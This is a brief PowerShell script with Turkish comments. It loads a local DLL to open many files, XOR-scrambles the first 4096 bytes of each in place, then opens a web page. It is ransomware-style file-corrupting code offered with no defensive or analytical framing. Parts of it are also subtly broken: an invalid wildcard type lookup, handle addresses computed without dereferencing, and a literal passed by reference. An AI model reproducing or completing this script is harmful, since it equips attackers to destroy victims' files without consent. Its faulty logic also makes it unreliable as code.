# Kernel32 API
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll")] public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpBytesRead, IntPtr lpOverlapped);
    [DllImport("kernel32.dll")] public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpBytesWritten, IntPtr lpOverlapped);
    [DllImport("kernel32.dll")] public static extern uint SetFilePointer(IntPtr hFile, int lDistanceToMove, ref int lpDistanceToMoveHigh, uint dwMoveMethod);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
}
"@

# DLL’in tam yolu
$dllPath = "C:\Users\YourUser\Desktop\file_read_open.dll"
$asmBytes = [System.IO.File]::ReadAllBytes($dllPath)
$asm = [Reflection.Assembly]::Load($asmBytes)

# Assembly fonksiyonu çağır
$openAll = $asm.GetType("*").GetMethod("OpenAllFiles")
$openAll.Invoke($null,@())

# Handle array’i almak
$handlesField = $asm.GetType("*").GetField("handlesPtr")
$countField = $asm.GetType("*").GetField("handleCount")
$ptr = $handlesField.GetValue($null)
$count = $countField.GetValue($null)

for ($i=0; $i -lt $count; $i++) {
    $handle = [System.IntPtr]::new($ptr.ToInt64() + $i*8)  # pointer math

    $buffer = New-Object byte[] 4096
    $bytesRead = 0

    if ([Kernel32]::ReadFile($handle,$buffer,4096,[ref]$bytesRead,[IntPtr]::Zero)) {
        for ($j=0; $j -lt $bytesRead; $j++) {
            $buffer[$j] = $buffer[$j] -bxor 0xAA
        }
        $bytesWritten = 0
        [Kernel32]::SetFilePointer($handle,0,[ref]0,0)
        [Kernel32]::WriteFile($handle,$buffer,$bytesRead,[ref]$bytesWritten,[IntPtr]::Zero)
    }
    [Kernel32]::CloseHandle($handle)
}

# Web yönlendirme
Start-Process "https://www.example.com"
